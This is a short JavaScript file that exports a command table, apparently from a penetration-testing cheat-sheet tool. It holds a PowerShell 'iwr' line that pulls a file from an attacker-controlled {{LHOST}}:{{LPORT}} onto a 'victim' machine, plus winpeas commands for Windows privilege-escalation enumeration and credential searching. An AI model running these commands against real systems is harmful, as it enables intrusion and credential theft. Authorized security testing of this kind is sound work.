export var commands = {
    "gen" : {
        "Transfer File to victim (Powershell) ": "iwr http://{{LHOST}}:{{LPORT}}/{{LFILE}}"  
    },
    "winenum" : {
        "Enumerate using Winpeas": "./winpeas.exe",
        "Search For Credentials using winpeas": "./winpeas.exe credntials"
    }

}
